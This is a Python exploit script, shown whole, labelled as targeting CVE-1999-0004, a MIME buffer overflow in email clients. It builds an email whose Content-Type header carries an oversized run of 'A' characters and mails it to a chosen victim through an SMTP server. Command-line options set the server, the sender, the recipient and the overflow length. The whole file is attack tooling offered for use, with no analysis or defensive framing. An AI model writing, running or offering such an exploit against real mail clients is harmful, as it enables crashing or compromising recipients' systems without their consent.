#!/usr/bin/env python3
# CVE-1999-0004 - MIME Buffer Overflow Exploit for Email Clients

import argparse
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def build_mime_payload(length):
    overflow = "A" * length
    mime = MIMEMultipart("mixed")
    mime["Subject"] = "Test"
    mime["From"] = "attacker@example.com"
    mime["To"] = "victim@example.com"
    mime["MIME-Version"] = "1.0"
    mime.add_header("Content-Type", "multipart/mixed;" + overflow)
    body = MIMEText("This is the body of the email.")
    mime.attach(body)
    return mime.as_string()

def send_email(smtp_server, smtp_port, sender, recipient, message):
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.sendmail(sender, recipient, message)
            print(f"[+] Exploit email sent to {recipient}")
    except Exception as e:
        print(f"[!] Email delivery failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-1999-0004 - MIME Buffer Overflow Email Exploit")
    parser.add_argument("-s", "--smtp", required=True, help="SMTP server IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=25, help="SMTP server port (default: 25)")
    parser.add_argument("-f", "--from", dest="sender", required=True, help="Sender email address")
    parser.add_argument("-r", "--recipient", required=True, help="Recipient email address")
    parser.add_argument("-l", "--length", type=int, default=1024, help="Overflow length (default: 1024)")
    args = parser.parse_args()

    payload = build_mime_payload(args.length)
    send_email(args.smtp, args.port, args.sender, args.recipient, payload)

if __name__ == "__main__":
    main()
